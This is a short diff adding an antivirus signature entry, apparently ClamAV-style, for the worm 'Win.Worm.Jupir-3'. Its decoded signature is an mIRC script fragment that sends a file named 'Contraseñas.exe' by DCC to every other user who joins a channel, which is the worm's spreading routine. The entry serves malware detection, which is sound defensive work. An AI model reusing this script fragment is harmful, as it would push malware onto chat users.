@@ -1,0 +1,9 @@
+VIRUS NAME: Win.Worm.Jupir-3
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+n0=on 1:JOIN:#:{
+n1= /if ( $nick == $me ) { halt }
+n2= /.dcc send $nick C:\Contraseñas.exe
+n3=}
+
